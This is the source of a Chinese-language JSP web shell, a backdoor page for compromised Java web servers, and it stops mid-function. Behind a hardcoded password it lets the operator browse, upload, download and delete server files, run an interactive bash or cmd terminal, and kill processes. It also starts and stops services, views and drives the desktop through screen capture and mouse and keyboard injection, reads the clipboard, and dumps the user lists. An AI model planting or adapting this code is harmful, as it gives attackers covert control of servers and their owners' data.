<%@page contentType="text/html; charset=UTF-8" %><%@page import="java.util.zip.*" %><%//@page import="org.apache.tools.zip.*" %><%@ page import="java.io.*" %><%@ page import="java.net.*" %><%@page import="java.sql.*" %><%@page import="sun.awt.shell.ShellFolder"%><%@page import="javax.swing.filechooser.FileSystemView"%><%@ page import="java.util.*"%><%@ page import="java.math.*"%><%@page import="java.awt.*" %><%@page import="java.awt.event.*" %><%@page import="java.awt.image.*"%><%@page import="javax.swing.*"%><%@page import="java.awt.datatransfer.*"%><%@page import="javax.imageio.*"%><%@page import="java.util.regex.*"%><%!
private static final String PASSWORD="123456";//这里是用户的登陆密码
String uri;
private static final boolean isLinux=System.getProperty("os.name").startsWith("Linux");
private static final FileSystemView fsv = FileSystemView.getFileSystemView();
private static String START_TYPE[] ={"", "", "自动", "手动", "禁用"};
private static String STATE_TYPE[] ={"", "已停止", "", "", "已启动", "5", "6", "暂停"};
private static Rectangle rect[] = new Rectangle[8];
static
{
  Dimension d = Toolkit.getDefaultToolkit().getScreenSize();
  int width = d.width;
  int height = d.height;
  for (int i = 0; i < rect.length; i++)
  {
    rect[i] = new Rectangle(0, height / 8 * i, width, height / 8);
  }
}
public static String exec(String cmd, Writer out) throws IOException
{
  StringBuffer sb = new StringBuffer();
  int len = 0;
  byte by[] = new byte[cmd.length() * 10];
  Process p = Runtime.getRuntime().exec(cmd);
  InputStream is = p.getInputStream();
  while((len = is.read(by)) != -1)
  {
    String str = new String(by, 0, len);
    if(out != null)
    {
      out.write(str);
      out.flush();
    }
    sb.append(str);
  }
  is.close();
  return sb.toString();
}

public String unzip(File file, File dir) throws IOException
{
  if (file.getName().toLowerCase().endsWith(".zip"))
  {
    StringBuffer result = new StringBuffer();
    try
    {
      ZipFile zf = new ZipFile(file);
      Enumeration enumer = zf.entries(); //zf.getEntries();
      while (enumer.hasMoreElements())
      {
        ZipEntry ze = (ZipEntry) enumer.nextElement();
        String zename = ze.getName();
        result.append(zename + "<br/>");
        if (ze.isDirectory())
        {
          File file11 = new File(dir,zename);
          file11.mkdirs();
        } else
        {
          File file11 = new File(dir,zename).getParentFile();
          if (!file11.exists())
          {
            file11.mkdirs();
          }
          int i=0;
          byte zeby[] = new byte[8192];
          InputStream is = zf.getInputStream(ze);
          FileOutputStream fos = new FileOutputStream(dir.getAbsolutePath() + "/" + zename);
          while((i=is.read(zeby))!=-1)
          {
            fos.write(zeby,0,i);
          }
          is.close();
          fos.close();
        }
      }
      zf.close();
      result.append("全部完成");
      return result.toString();
    } catch (Exception e)
    {
      return (file.getName() + " 不是 ZIP 压缩文件");
    }
  } else
  {
    Runtime rt = Runtime.getRuntime();
    File f=new File("C:\\Program Files\\WinRAR\\UnRAR.exe");
    if(!f.exists())f=new File("D:\\Program Files\\WinRAR\\UnRAR.exe");
    if(!f.exists())f=new File(this.getServletContext().getRealPath(uri)+"\\UnRAR.exe");
    String path=f.exists()?f.getPath():"unrar";
    Process p = rt.exec("\"" + path + "\" x -o+ -p- " + file.getAbsolutePath() + " " + dir.getAbsolutePath());
    StringBuffer sb = new StringBuffer();
    InputStream fis = p.getInputStream();
    int value = 0;
    while ((value = fis.read()) != -1)
    {
      sb.append((char) value);
    }
    fis.close();
    String result = new String(sb.toString().getBytes("ISO-8859-1"), "GBK");
    int index = result.indexOf("中解压");
    if (index == -1)
    {
      return (file.getName() + " 不是 RAR 压缩文件");
    } else
    {
      index += 4;
      result = result.substring(index);
      result = result.replaceAll("\r\n", "<br/>").replaceAll("  ", "　");//.replaceAll("\n", "<BR/>").replaceAll("\\\\", "/").replaceAll(file.getAbsolutePath(), "");
      return (result);
    }
  }
}
public static void zip(String ps[],OutputStream os)throws IOException
{
  ZipOutputStream zos = new ZipOutputStream(os);
  for(int i=0;i<ps.length;i++)
  {
    zip(zos,new File(ps[i]),"");
  }
  zos.close();
}
public static void zip(ZipOutputStream zos, File file, String context) throws IOException
{
  if (file.isFile())
  {
    int i=0;
    byte by[] = new byte[8192];
    FileInputStream is = new FileInputStream(file);
    zos.putNextEntry(new ZipEntry(context + file.getName()));
    while((i=is.read(by))!=-1)
    {
      zos.write(by,0,i);
    }
    is.close();
    zos.closeEntry();
  } else
  if (file.isDirectory())
  {
    context=context + file.getName() + "/";
    zos.putNextEntry(new ZipEntry(context));
    zos.closeEntry();
    File files[] = file.listFiles();
    if (files != null)
    {
      for (int i = 0; i < files.length; i++)
      {
        zip(zos, files[i], context);
      }
    }
  }
}
public void del(File f)
{
  if (f.isDirectory())
  {
    File fs[] = f.listFiles();
    for (int i = 0; i < fs.length; i++)
    {
      del(fs[i]);
    }
  }
  f.delete();
}

public void copy(File s,File d)throws IOException
{
  d=new File(d,s.getName());
  if(s.isDirectory())
  {
    d.mkdir();
    File fs[]=s.listFiles();
    for(int i=0;i<fs.length;i++)
    {
      copy(fs[i],d);
    }
  }else
  {
    byte by[] = new byte[8192];
    FileInputStream fis=new FileInputStream(s);
    FileOutputStream fos=new FileOutputStream(d);
    int i=0;
    while((i=fis.read(by))!=-1)
    {
      fos.write(by,0,i);
    }
    fis.close();
    fos.close();
  }
}

public static File getLnkpath(File f)throws IOException
{
  if(f.exists())
  {
    byte by[]=new byte[(int)f.length()];
    FileInputStream fis=new FileInputStream(f);
    fis.read(by);
    fis.close();
    String str=new String(by,"GBK");
    String prefix=new StringBuffer(7).append((char)42).append((char)65533).append((char)16).append((char)0).append((char)0).append((char)0).append((char)0).toString();
    int i=str.indexOf(prefix)+7;
    if(i>6)
    {
      StringBuffer path=new StringBuffer();
      for(int j=i;j<str.length();i++)
      {
        int ch=str.charAt(i);
        if(ch!=0)
        {
          path.append((char)ch);
        }else
        {
          break;
        }
      }
      return new File(path.toString());
    }
  }
  return f;
}

%><%

String user=(String)session.getAttribute("user");

uri=request.getRequestURI();
uri=uri.substring(0,uri.lastIndexOf('/'));

request.setCharacterEncoding("UTF-8");

String p=request.getParameter("p");
if(p==null)p="/";
File f = new File(p);
if(!f.exists())
{
  p=new String(p.getBytes("ISO-8859-1"),"UTF-8");
  f = new File(p);
}
String v=request.getParameter("v");
String ps[]=request.getParameterValues("ps");
String mt=request.getParameter("mt");
if(mt==null)mt="file";
int pos=0;
String tmp=request.getParameter("pos");
if(tmp!=null)
{
  pos=Integer.parseInt(tmp);
}
int oby=1;
tmp=request.getParameter("oby");
if(tmp==null)
{
  tmp=(String)session.getAttribute("oby");
}
if(tmp!=null)
{
  oby=Integer.parseInt(tmp);
  session.setAttribute("oby",String.valueOf(oby));
}
//版本
boolean ver=true;
Boolean btmp=(Boolean)session.getAttribute("ver");
if(btmp!=null)
{
  ver=btmp.booleanValue();
}
///////////////////////////////////
if(mt.length()>5)
{
  if(user==null)
  {
    user=request.getParameter("user");
    String pwd=request.getParameter("pwd");
    ver="true".equals(request.getParameter("ver"));
    if(user.equals("Kiss")&&pwd.equals(PASSWORD))
    {
      session.setAttribute("ver",new Boolean(ver));
      session.setAttribute("user",user);
    }else
    {
      out.print("<script>history.back();alert('用户名或密码错误!!!');</script>");
      return;
    }
  }
  out.clear();
  if(mt.equals("file.mkdir"))
  {
    f=new File(f,v);
    f.mkdirs();
  }else if(mt.equals("file.del"))
  {
    for(int i=0;i<ps.length;i++)
    {
      del(new File(ps[i]));
    }
  }else if(mt.equals("file.unzip"))
  {
    for(int i=0;i<ps.length;i++)
    {
      unzip(new File(ps[i]),f);
    }
  }else if(mt.equals("file.zip"))
  {
    File co=new File(ps[0]+".zip");
    while(co.exists())
    {
      co=new File(ps[0]+"_"+System.currentTimeMillis()+".zip");
    }
    zip(ps,new FileOutputStream(co));
  }else if(mt.equals("file.down"))
  {
    response.setContentType("application/octet-stream");
    response.setHeader("Content-Disposition", "attachment; filename=" + URLEncoder.encode("file.zip","UTF-8"));
    zip(ps,response.getOutputStream());
    return;
  }else if(mt.equals("file.ren"))
  {
    for(int i=0;i<ps.length;i++)
    {
      File re=new File(f,v+(i==0?"":" ("+i+")"));
      new File(ps[i]).renameTo(re);
    }
  }else if(mt.equals("file.cut")||mt.equals("file.copy"))
  {
    session.removeAttribute("file.cut");
    session.removeAttribute("file.copy");
    session.setAttribute(mt,ps);
  }else if(mt.equals("file.paste"))
  {
    ps=(String[])session.getAttribute("file.cut");
    if(ps!=null)
    {
      out.print("剪切...<br>");
      for(int i=0;i<ps.length;i++)
      {
        if(p.startsWith(ps[i]))
        {
          out.print("跳过"+ps[i]+"<br/>");
          continue;
        }
        File cut=new File(ps[i]);
        boolean rs=cut.renameTo(new File(f,cut.getName()));
        if(!rs)
        {
          copy(cut,f);
          del(cut);
        }
        out.print(ps[i]+"<br/>");
        out.flush();
      }
      session.removeAttribute("file.cut");
    }else
    if((ps=(String[])session.getAttribute("file.copy"))!=null)
    {
      out.print("复制...<br>");
      for(int i=0;i<ps.length;i++)
      {
        if(p.startsWith(ps[i]))
        {
          out.print("跳过"+ps[i]+"<br/>");
          continue;
        }
        copy(new File(ps[i]),f);
        out.print(ps[i]+"<br>");
        out.flush();
      }
    }
    out.print("完成,<A href=?p="+URLEncoder.encode(p,"UTF-8")+" >返回</A>");
    return;
  }else if(mt.equals("file.ext"))
  {
    if(f.exists())
    {
      try
      {
    	 Image i=((ImageIcon)fsv.getSystemIcon(f)).getImage();
    	 BufferedImage bi=new BufferedImage(16,16,BufferedImage.TYPE_4BYTE_ABGR);
    	 bi.createGraphics().drawImage(i,0,0,null);
        //BufferedImage bi=(BufferedImage)((ImageIcon)fsv.getSystemIcon(f)).getImage();
        OutputStream os=response.getOutputStream();
        ImageIO.write(bi,"PNG",os);
        os.close();
      }catch(Exception ex)
      {
      }
    }
    return;
  }else if(mt.equals("file.dl"))
  {
    response.setContentType("application/octet-stream");
    response.setHeader("Content-Disposition", "attachment; filename=" + URLEncoder.encode(f.getName(),"UTF-8"));
    int len=(int)f.length();
    response.setContentLength(len);
    FileInputStream fis=new FileInputStream(f);
    OutputStream os=response.getOutputStream();
    byte by[]=new byte[8192];
    int value=0;
    try
    {
      while((value=fis.read(by))!=-1)
      {
        os.write(by,0,value);
      }
    }finally
    {
      fis.close();
      os.close();
    }
    return;
  }else if(mt.equals("file.upload"))
  {
    String ce = request.getCharacterEncoding();
    if(ce == null)ce = System.getProperty("file.encoding");
    String ct = request.getContentType();
    ct="--" + ct.substring(30);
    int j=0;
    byte by[] = new byte[8192];
    ServletInputStream is = request.getInputStream();
    is.readLine(by,0,by.length);//ct
    while((j=is.readLine(by,0,by.length))!=-1)
    {
      String line = new String(by, 0, j, ce);//Content-Disposition
      int x = line.indexOf("name=\"") + 6;
      int y = line.indexOf("\"", x);
      String name = line.substring(x, y);
      x = line.indexOf("filename=\"", y) + 10;
      is.readLine(by,0,by.length);//Content-Type: application/msword 或 rn
      if(x > 10)
      {
        y = line.indexOf("\"", x);
        String fn = line.substring(x, y);
        x = fn.lastIndexOf('\\');
        if(x != -1)
        fn = fn.substring(x + 1);
        OutputStream os = new FileOutputStream(new File(p, fn));
        boolean rn = false;
        j=is.readLine(by,0,by.length);//rn
        if(j==2)
        {
          j=is.readLine(by,0,by.length);//
        }
        do
        {
          if(rn)
          {
            os.write(13);
            os.write(10);
          }
          if(j > 2 && by[j - 2] == 13 && by[j - 1] == 10)
          {
            rn = true;
            j -= 2;
          } else
          {
            rn = false;
          }
          os.write(by, 0, j);
          j = is.readLine(by,0,by.length);
          line = new String(by, 0, j, ce);
        } while(!line.startsWith(ct));
        os.close();
      }else
      {
        j =is.readLine(by,0,by.length);
        line = new String(by, 0, j, ce);
        StringBuffer sb = new StringBuffer();
        do
        {
          sb.append(line);
          j =is.readLine(by,0,by.length);
          line = new String(by, 0, j, ce);
        } while(!line.startsWith(ct));
        sb.setLength(sb.length() - 2);
        if(name.equals("p"))
        {
          p=sb.toString();
        }
      }
    }
    is.close();
  }else if(mt.equals("wins.screen"))
  {
    Robot r = new Robot();
    BufferedImage bi = r.createScreenCapture(rect[Integer.parseInt(v)]);
    //ByteArrayOutputStream os = new ByteArrayOutputStream();
    OutputStream os=response.getOutputStream();
    try
    {
      ImageIO.write(bi, "PNG", os);
    }catch(Exception ex)
    {}
    //byte by[] = os.toByteArray();
    os.close();
    return;
  }else if(mt.equals("wins.event"))
  {
    Robot r = new Robot();
    String event=request.getParameter("e");
    if (event.startsWith("mouse"))
    {
      int x = Integer.parseInt(request.getParameter("x"));
      int y = Integer.parseInt(request.getParameter("y"));
      int b = Integer.parseInt(request.getParameter("b"));//16:左,8:中,4:右
      switch(b)
      {
        case 0:
        b=16;
        break;
        case 1:
        b=8;
        break;
        case 2:
        b=4;
        break;
      }
      r.mouseMove(x, y);
      if (event.equals("onmouseclick"))
      {
        r.mousePress(b);
        r.mouseRelease(b);
      } else
      if ("onmousedblclick".equals(event))
      {
        r.mousePress(KeyEvent.BUTTON1_MASK);
        r.mouseRelease(KeyEvent.BUTTON1_MASK);
        r.mousePress(KeyEvent.BUTTON1_MASK);
        r.mouseRelease(KeyEvent.BUTTON1_MASK);
      } else
      if (event.equals("mousedown"))
      {
        r.mousePress(b);
      } else
      if (event.equals("mouseup"))
      {
        r.mousePress(b);
        r.mouseRelease(b);
      }
    } else if (event.startsWith("key"))
    {
      int k = Integer.parseInt(request.getParameter("k"));
      if (k > 218 && k < 222) //[:219-91,  \:220-92,  ]:221-93
      {
        k = k - 128;
      } else if (k > 187 && k < 192) //,:188-44,  .:190-46,  /:191-47
      {
        k = k - 144;
      } else
      {
        switch (k)
        {
          case 45: //insert
            k = 155;
            break;
          case 46:
            k = 127;
            break;
          case 91: //win
          case 92:
            k = 524;
            break;
          case 93: //右键
            k = 525;
            break;
            //        case 37://left
            //        k=226;
            //        break;
            //        case 38://up
            //        k=224;
            //        break;
            //        case 39://right
            //        k=227;
            //        break;
            //        case 40://down
            //        k=225;
            //        break;
          case 13:
            k = 10;
            break;
        }
      }
      if (event.equals("keydown"))
      {
        r.keyPress(k);
      } else if (event.equals("keypress"))
      {
        r.keyPress(k);
      } else if (event.equals("keyup"))
      {
        r.keyRelease(k);
      }
    }
    return;
  }else if(mt.equals("wins.cb"))
  {
    Clipboard cb=Toolkit.getDefaultToolkit().getSystemClipboard();
    cb.setContents(new StringSelection(v),null);
    out.print("<script>window.close();</script>");
    return;
  }else if(mt.equals("task.kill"))
  {
    for(int i=0;i<ps.length;i++)
    {
      exec((isLinux ? "kill -9 " : "tskill ") + ps[i], null);
    }//ntsd -c q -p PID 　
  }else if(mt.equals("serv.start")||mt.equals("serv.stop")||mt.equals("serv.restart"))
  {
    StringBuffer js=new StringBuffer();
    String cmd=mt.substring(5);
    for(int i=0;i<ps.length;i++)
    {
      if(isLinux)
      {
        ps[i]="/etc/init.d/"+ps[i]+" "+cmd;
      }else if(cmd.equals("restart"))
      {
        ps[i]="cmd /c net stop "+ps[i]+" & net start "+ps[i];
      }else
      {
        ps[i]="net "+cmd+" "+ps[i];
      }
      String str=exec(ps[i], null);
      js.append(str);
    }
    //out.print("<script>alert(\""+js.toString()+"\");</script>");
    //return;
  }else if(mt.equals("serv.restart"))
  {
    for(int i=0;i<ps.length;i++)
    {
      String str=  exec(isLinux ? "/etc/init.d/ "+ps[i]+" restart" : "net stop "+ps[i]+" & net start "+ps[i], null);
      out.print("<script>alert('"+str+"');</script>");
    }
    return;
  }else if(mt.equals("term.cmd"))
  {
    String txt=(String)session.getAttribute("txt");
    Process pro=(Process)session.getAttribute("cmd");
    if(pro==null)
    {
      pro=Runtime.getRuntime().exec(isLinux?"bash":"cmd",null,f);
      session.setAttribute("cmd",pro);
      txt="";
    }
    if(v!=null)
    {
      v=v+"\r\n";
      OutputStream os=pro.getOutputStream();
      if(isLinux)
      {
        v="pwd>mtc.txt\n"+v.substring(0,v.length()-2)+">>/mtc.txt\n";
      }
      String quc=v.trim().toLowerCase();
      if(quc.equals("restart"))
      {
        os.write(v.getBytes());
      }else if(quc.equals("env"))
      {
        txt=txt+"<table>";
        Properties sps=System.getProperties();
        Enumeration e=sps.keys();
        while(e.hasMoreElements())
        {
          String name=(String)e.nextElement();
          String value=(String)sps.get(name);
          txt=txt+"<tr><td>"+name+"<td>"+value;
        }
        txt=txt+"</table>";
      }else
      {
        os.write(v.getBytes());
        if(quc.equals("exit"))
        {
          session.removeAttribute("cmd");
        }
      }
      os.flush();
      if(quc.startsWith("net stop tomcat"))
      {
        if(!"SYSTEM".equals(System.getProperty("user.name")))//如果不是服务
        {
          String cmd="tskill "+quc.split(" ")[2]+"\r\n";
          os.write(cmd.getBytes());
          os.flush();
          System.exit(0);
        }
      }
      Thread.sleep(500L);
    }
    if(v!=null||(txt.length()==0&&!isLinux))
    {
      InputStream is=pro.getInputStream();
      if(isLinux)
      {
        is=new FileInputStream("/mtc.txt");
        txt=txt+"\n"+v;
      }
      for(int i=0;i<10||is.available()>0;i++)
      {
        if(i==9)is=pro.getErrorStream();
        if(is.available()==0)
        {
          Thread.sleep(500L);
        }else
        {
          i=0;
          byte by[]=new byte[is.available()];
          is.read(by);
          String str=new String(by).replaceAll("<","&lt;");
          //cls
          int cls=str.lastIndexOf("\f");
          txt=cls==-1?txt+str:str.substring(cls+1);
        }
      }
      session.setAttribute("txt",txt);
    }
    out.print("<pre>"+txt+"</pre>");
  }
  if(!mt.equals("term.cmd"))
  {
    response.sendRedirect(request.getRequestURI()+"?mt="+mt.substring(0,4)+"&p="+URLEncoder.encode(p,"UTF-8"));
    return;
  }
}




String mt4=mt.substring(0,4);
%>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title><%=p%> 刺客安全网JSP连接器</title>
<style type="text/css">
body
{
margin-left: 0px;
margin-top: 0px;
margin-right: 0px;
margin-bottom: 0px;
}
body,td,th
{
  font-size: 12px;
}
img
{
border: 0;
vertical-align:middle;
}
table
{
width:100%;
border:1px solid #bbd7e6;
}
th
{
border-bottom:1px solid #bbd7e6;
background-color:#E1ECFE;
}
.I
{
width:16px;
height:16px;
}
.H
{
  filter:alpha(opacity=50)
}
.t<%=oby%>
{
background:#F7F7F7;
}
.t2
{
text-align:right;
}
</style>
<script type="text/javascript">
function f(v)
{
  form1.mt.value=v;
}
function s(b)
{
  form1.ps.checked=b;
  for(var i=0;i<form1.ps.length;i++)
  {
    form1.ps[i].checked=b;
  }
}
function d(mt,dv)
{
  var t;
  switch(mt)
  {
    case "file.ren":
    t="请输入新的名字";
    dv="这里输入新名子";
    break;
    case "file.mkdir":
    t="新建文件夹";
    dv="新建文件夹";
    break;
    case "file.del":
    t="确认删除?";
    break;
    case "file.upload":
    form1.encoding="multipart/form-data";
    form1.action="?mt="+mt;
    break;
    case "term.cmd":
    form1.cmd.disabled=true;
    break;
    default:
    form1.method="get";
  }
  if(t)
  {
    dv=dv?prompt(t,dv):confirm(t);
    if(!dv) return false;
  }
  form1.v.value=dv;
  form1.mt.value=mt;
  form1.submit();
}
function c()
{
  var ps=document.form1.ps;
  if(ps)
  {
    var flag=ps.checked;
    for(var i=0;i<ps.length;i++)
    {
      if(ps[i].checked)
      {
        flag=true;
        break;
      }
    }
    var ids=new Array("cut","copy","del","ren","unzip","zip","down","kill","start","stop","restart");
    for(var i=0;i<ids.length;i++)
    {
      var obj=document.getElementById(ids[i]);
      if(obj)obj.disabled=!flag;
    }
  }
}
setInterval(c,100);
//排序
function o(field)
{
  var url=location.search.substring(1);
  window.open("?oby="+field+"&"+url,"_self");
}
//
var down=false;
function fevent(event)
{
  if(!event)event=window.event;
  if(event.type=="mousedown")
  {
    down=true;
//    try
//    {
//      this.setCapture();
//    }catch(e)
//    {
//      document.addEventListener("mousemove",fevent,true);
//    }
  }else if(event.type=="mouseup")
  {
    down=false;
//    try
//    {
//      this.releaseCapture();
//    }catch(e)
//    {
//      document.removeEventListener("mousemove",fevent,true);
//    }
  }
  if(down||event.type!="mousemove")
  {
    var button=event.button;
    if(document.all)
    {
      switch(button)
      {
        case 1:
        button=0;
        break;
        case 4:
        button=1;
        break;
        case 3:
        return;
      }
    }
    var x=event.clientX+document.body.scrollLeft;
    var y=event.clientY+document.body.scrollTop-20;
    ifr.src=ifr.location=('?mt=wins.event&x='+x+'&y='+y+'&k='+(event.keyCode||event.which)+'&b='+button+'&e='+event.type);
  }
  //document.getElementById('xy').value=(event.keyCode||event.which);
  try
  {
    event.keyCode=0;
    event.returnValue=false;
  }catch(e)
  {
    return false;
  }
}
</script>
</head>

<body>
<form name="form1" action="?" enctype="application/x-www-form-urlencoded" method="post">
<input type="hidden" name="mt" value="<%=mt%>"/>
<input type="hidden" name="v" value=""/>
<%
if(user==null)
{
%>
<br>
<center><P align=center><FONT size=4>雕Pai卫生巾 Jsp Shell 仿桌面</FONT></P>
<table align="center" style='width:500px'>
  <tr>
    <td align="right">用户名:</td>
    <td><input type="text" name="user" value="雕Pai卫生巾" /></td>
  </tr>
  <tr>
    <td align="right">密码:</td>
    <td><input type="password" name="pwd" value="123456"/></td>
  </tr>
  <tr>
    <td align="right">版本:</td>
    <td><select name="ver">
    <option value="true">普通</option>
    <option value="false">极速</option>
    </td>
  </tr></center>
  <tr>
    <td>&nbsp;</td>
    <td><input type="submit" value="登陆" onclick="d('file.login')" /></td>
  </tr>
</table>
<script type="">form1.user.focus();</script>
<%
}else if("win0".equals(mt4))//获取服务器剪贴板内容
{
  Clipboard cb=Toolkit.getDefaultToolkit().getSystemClipboard();
  Transferable tr=cb.getContents(null);
  String str="";
  if(tr.isDataFlavorSupported(DataFlavor.stringFlavor))
  {
    str=(String) tr.getTransferData(DataFlavor.stringFlavor);
  }
  out.print("<textarea id='cb' style='width:100%' rows='10' wrap='off'>"+str.replaceAll("</","&lt;/")+"</textarea>");
  out.print("<input type='button' value='确定' onclick=d('wins.cb',cb.value)><input type='button' value='关闭' onclick='window.close();'>");
  return;
}else
{
  String rem[]={"文件","终端","桌面","任务","服务","用户","信息"};
  String cmd[]={"file","term","wins","task","serv","user","info"};
  out.print("<select onchange='d(value)'>");
  for(int i=0;i<cmd.length;i++)
  {
    out.print("<option value='"+cmd[i]+"'");
    if(cmd[i].equals(mt4))
    {
      out.print(" selected=''");
    }
    out.print(">"+rem[i]);
  }
  out.print("</select>");
  if("term".equals(mt4))
  {
    out.print("<input name='p' type='hidden' value=\""+p+"\"/>");
    out.print("<textarea name='cmd' style='width:100%;overflow-y:visible;' rows='5' onkeypress=\"if(!event.shiftKey&&event.keyCode==13){ event.returnValue=false; d('term.cmd',value); }\"></textarea><script>form1.cmd.focus();</script>");
    out.print("<br/><br/><br/>");
    out.print("<table style='width:400'>");
    out.print("  <tr><th>功能</th><th>命令</th></tr>");
    out.print("  <tr><td>重启机器</td><td>shutdown -r -f -time 0</td></tr>");
    out.print("  <tr><td>解压文件</td><td>unrar x -y xxxx.rar</td></tr>");
    out.print("  <tr><td>重启服务</td><td>net stop tomcat6 &amp; net start tomcat6</td></tr>");
    out.print("  <tr><td>环境信息</td><td>env</td></tr>");
    out.print("</table>");
  }else if("wins".equals(mt4))
  {
    out.print("<input type='button' value='剪贴板' onclick=window.open('?mt=win0','','width=400,height=200,resizable=1')><br>");
    for(int i=0;i<8;i++)
    {
      out.print("<img name=img src=?mt=wins.screen&v="+i+" onmousedown='fevent(event)' onmousemove='fevent(event)' onmouseup='fevent(event)'><br>");
    }
    out.print("<script>");
    out.print("document.body.onkeydown=fevent;");
    out.print("document.body.onkeyup=fevent;");
    out.print("document.body.oncontextmenu=function(){return false};");
    out.print("document.body.onselectstart=function(){return false};");
    out.print("var img=document.getElementsByName('img');");
    out.print("function ftimeout()");
    out.print("{");
    out.print("  for(var i=0;i<img.length;i++)");
    out.print("  {");
    out.print("    img[i].src='?mt=wins.screen&v='+i+'&t='+new Date().getTime();");
    out.print("  }");
    out.print("}");
    out.print("window.setInterval(ftimeout,2000);");
    out.print("</script>");
    out.print("<iframe id='ifr' src='about:blank' style='display:none'></iframe>");
  }else if("task".equals(mt4))
  {
    out.print("<input type='button' id='kill' value='结束进程' onclick=d('task.kill'); />");
    out.print("<table>");
    String str = exec(isLinux ? "ps uax" : "tasklist /v /fo csv", null);
    String trs[] = str.trim().split("\n");
    for(int i = 0; i < trs.length; i++)
    {
      if(trs[i].startsWith("\"tasklist.exe\""))
      continue;
      String tds[] = trs[i].split(isLinux ? " +" : "\",\"");
      out.print("<tr onmouseover=bgColor='#BCD1E9' onmouseout=bgColor=''><td><input type='checkbox' name='ps' value='" + tds[1] + "' onclick=if(value=='PID')s(checked)>");
      for(int j = 0; j < tds.length; j++)
      {
        if(isLinux)
        {
          if(tds[j].charAt(0) == '/')// linux: 绝对路径中取名称
          {
            int x = tds[j].lastIndexOf("/");
            if(x != -1)
            tds[j] = tds[j].substring(x + 1);
          }
        } else
        if(j == 0)
        tds[j] = tds[j].substring(1);
        else
        if(j == tds.length - 1)
        tds[j] = tds[j].substring(0, tds[j].length() - 2);
        else
        if(j == 6)
        tds[j] = tds[j].substring(tds[j].indexOf('\\') + 1);
        out.print(i==0?"<th nowrap>":"<td>");
        out.print(tds[j]);
      }
      out.print("</tr>\n");
    }
    out.print("</table>");
  }else if("serv".equals(mt4))
  {
    out.print("<input type='button' id='start' value='启动' onclick=d('serv.start'); />");
    out.print("<input type='button' id='stop' value='停止' onclick=d('serv.stop'); />");
    out.print("<input type='button' id='restart' value='重启' onclick=d('serv.restart'); />");
    out.print("<table>");
    if (isLinux)
    {
      out.print("<tr><th><th>服务名称<th>状态<th>描述</tr>");
      File fs[] = new File("/etc/rc.d/init.d/").listFiles();
      for (int i = 0; i < fs.length; i++)
      {
        String name = fs[i].getName();
        out.print("<tr onmouseover=bgColor='#BCD1E9' onmouseout=bgColor=''><td><input type='checkbox' name='ps' value=" + name + ">");
        out.print("<td>"+name);
        //
        String str = exec("/etc/init.d/" + name + " status", null);
        int j = str.indexOf(" ");
        out.print("<td>"+str.substring(j + 1));
        //
        byte by[] = new byte[500];
        FileInputStream fis = new FileInputStream(fs[i]);
        fis.read(by);
        fis.close();
        str = new String(by).replaceAll("\\\\\n#", "");
        j = str.indexOf("# description: ");
        if (j != -1)
        {
          str = str.substring(j + 15, str.indexOf("\n", j));
        }
        out.print("<td title=\""+str+"\">");
        if (str.length() > 20)
        {
          str = str.substring(0, 17) + "...";
        }
        out.print(str);
        out.print("\n");
      }
    } else
    {
      out.print("<tr><td><th>名称<th>描述<th>状态<th>启动类型<th>登录为</tr>");
      String str = exec("sc query state= all", null);
      String ss[] = str.split("SERVICE_NAME: ");
      for (int i = 1; i < ss.length; i++)
      {
        String rs[] = ss[i].split("\r\n");
        String sname = rs[0];
        String title = rs[1].substring(14);
        int state = rs[3].charAt(29) - 48;
        int start=0;
        String desc=null,path=null,login=null;
        if(ver)
        {
          //描述
          //str = exec("sc qdescription " + rs[0], null);
          //desc = str.substring(str.indexOf(":  ") + 3);
          //
          str = exec("sc qc \"" + rs[0]+"\"", null);
          rs = str.split("\r\n");
          start = rs[4].charAt(29) - 48;
          path = rs[6].substring(29);
          login = rs[11].substring(29);
          if (login.equalsIgnoreCase("LocalSystem"))
          {
            login = "本地系统";
          } else if (login.equalsIgnoreCase("NT AUTHORITY\\LocalService"))
          {
            login = "本地服务";
          } else if (login.equalsIgnoreCase("NT AUTHORITY\\NetworkService"))
          {
            login = "网络服务";
          }
        }
        out.print("<tr onmouseover=bgColor='#BCD1E9' onmouseout=bgColor='' title=\"");
        out.print("服务名　:"+sname+"&#13;");
        out.print("显示名　:"+title+"&#13;");
        out.print("描述　　:"+desc+"&#13;");
        out.print("状态　　:"+STATE_TYPE[state]+"&#13;");
        out.print("启动类型:"+START_TYPE[start]+"&#13;");
        out.print("路径　　:"+path.replaceAll("\"","&quot;")+"&#13;");
        out.print("登录为　:"+login+"\">");
        if (title!=null&&title.length() > 30)
        {
          title = title.substring(0, 27) + "...";
        }
        if (desc!=null&&desc.length() > 20)
        {
          desc = desc.substring(0, 17) + "...";
        }
        out.print("<td><input type='checkbox' name='ps' value=\"" + sname + "\">");
        out.print("<td>");
        if(path!=null)
        {
          int j=path.indexOf(" ");
          if(j!=-1)path=path.substring(0,j);
          out.print("<img src='?mt=file.ext&p="+URLEncoder.encode(path,"UTF-8")+"' class='I'>");
        }
        out.print(title);
        out.print("<td>"+desc);
        out.print("<td>"+STATE_TYPE[state]);
        out.print("<td>"+START_TYPE[start]);
        out.print("<td>"+login+"\n");
      }
    }
    out.print("</table>");
  }else if("user".equals(mt4))
  {
    out.print("<table>");
    File fpwd = new File("/etc/passwd");
    if (fpwd.exists())
    {
      byte by[] = new byte[ (int) fpwd.length()];
      FileInputStream fis = new FileInputStream(fpwd);
      fis.read(by);
      fis.close();
      String str = new String(by);
      str = ("\n" + str.substring(0, str.length() - 1)).replaceAll("\n", "<tr onmouseover=bgColor='#BCD1E9' onmouseout=bgColor=''><td>").replaceAll(":", "<td>");
      str = "<tr><th>用户名<th>口令<th>用户标识号<th>组标识号<th>注释性描述<th>主目录<th>登录Shell</tr>" + str;
      out.print(str);
    } else
    {
      out.print("<tr><th>用户名<th>全名<th>注释<th>用户的注释<th>国家(地区)代码<th>帐户启用<th>帐户到期<th>上次设置密码<th>密码到期<th>密码可更改<th>需要密码<th>用户可以更改密码<th>允许的工作站<th>登录脚本<th>用户配置文件<th>主目录<th>上次登录<th>可允许的登录小时数<th>本地组成员<th>全局组成员</tr>");
      String str = exec("net user", null);
      str = str.substring(str.indexOf("-\r\n") + 3);
      String us[] = str.split(" +");
      for (int i = 0; i < us.length - 1; i++)
      {
        out.print("<tr onmouseover=bgColor='#BCD1E9' onmouseout=bgColor=''>");
        // out.print("<td>"+us[i]);
        String s[] = exec("net user " + us[i], null).split("(\r\n)+");
        for (int j = 0; j < s.length - 1; j++)
        {
          out.print("<td>"+s[j].substring(s[j].indexOf(' ') + 1));
